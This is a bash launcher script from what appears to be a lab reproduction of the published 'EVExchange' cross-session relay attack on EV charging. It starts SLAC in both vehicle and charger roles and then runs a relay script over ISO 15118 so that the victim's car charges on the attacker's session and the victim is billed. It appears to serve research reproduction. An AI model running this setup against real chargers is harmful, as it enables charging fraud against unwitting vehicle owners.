#!/bin/bash
# Dev2-side SLAC (both local roles) + HLC (proxy/dev_relay.py) launcher --
# the EVExchange cross-session relay attack (see README "EVExchange
# cross-session relay", evexchange_attack.pdf). Dev2 sits between the
# attacker's real EV (EVCC_Attacker) and real charger (SECC_Attacker),
# mirroring Dev1's setup on proxy_net3/proxy_net4 instead of
# proxy_net1/proxy_net2. See dev_relay.py's own docstring for the full
# cross-wire explanation.
#
# ATTACKER_STOP_AFTER_S (env var, see docker-compose.yml) is normally set
# on THIS container -- dev_relay.py reads it directly -- since Dev2's
# local EVCC is the attacker's, and it's the attacker's own relayed
# session (the one that ends up physically charging the victim's car via
# SECC) that needs to be cut short to produce the paper's billing
# asymmetry. See README "EVExchange cross-session relay".
#
# Which of this container's interfaces are proxy_net3/proxy_net4 is
# resolved by subnet at runtime, NOT assumed by name -- same principle as
# everywhere else in this repo.
set -uo pipefail

resolve_iface() {
    local v4_prefix="$1" v6_prefix="$2"
    ip -br a | grep -E "${v4_prefix}|${v6_prefix}" | awk '{print $1}' | cut -d@ -f1 | head -n1
}

PROXY_NET3_IFACE="$(resolve_iface '172\.29\.' '2001:db8:4:')"   # SECC_Attacker-facing
PROXY_NET4_IFACE="$(resolve_iface '172\.30\.' '2001:db8:5:')"   # EVCC_Attacker-facing

if [ -z "$PROXY_NET3_IFACE" ]; then
    echo "WARNING: no interface found on proxy_net3 (172.29.0.0/16 / 2001:db8:4::/64), falling back to eth0" >&2
    PROXY_NET3_IFACE="eth0"
fi
if [ -z "$PROXY_NET4_IFACE" ]; then
    echo "WARNING: no interface found on proxy_net4 (172.30.0.0/16 / 2001:db8:5::/64), falling back to eth1" >&2
    PROXY_NET4_IFACE="eth1"
fi

echo "=== [1/2] AcCCS SLAC, both roles, concurrently ==="
echo "    PEV role  (vs. real SECC_Attacker)  on $PROXY_NET3_IFACE (proxy_net3)"
echo "    EVSE role (vs. real EVCC_Attacker)  on $PROXY_NET4_IFACE (proxy_net4)"
cd /usr/src/app/mod_acccs
SLAC_ONLY=1 timeout 20 python PEV.py -I "$PROXY_NET3_IFACE" &
PEV_PID=$!
SLAC_ONLY=1 timeout 20 python EVSE.py -I "$PROXY_NET4_IFACE" &
EVSE_PID=$!
wait "$PEV_PID"
echo "=== Dev2 PEV-role SLAC exited with code $? ==="
wait "$EVSE_PID"
echo "=== Dev2 EVSE-role SLAC exited with code $? — proceeding to HLC regardless ==="

echo "=== [2/2] HLC cross-session relay (dev_relay.py), peer = Dev1 ==="
cd /usr/src/app/iso15118
exec /venv/bin/python3 dev_relay.py \
    --secc-net-v4 172.29.0.0/16 --secc-net-v6 2001:db8:4::/64 \
    --evcc-net-v4 172.30.0.0/16 --evcc-net-v6 2001:db8:5::/64 \
    --peer-host Dev1 --capture --show-hex
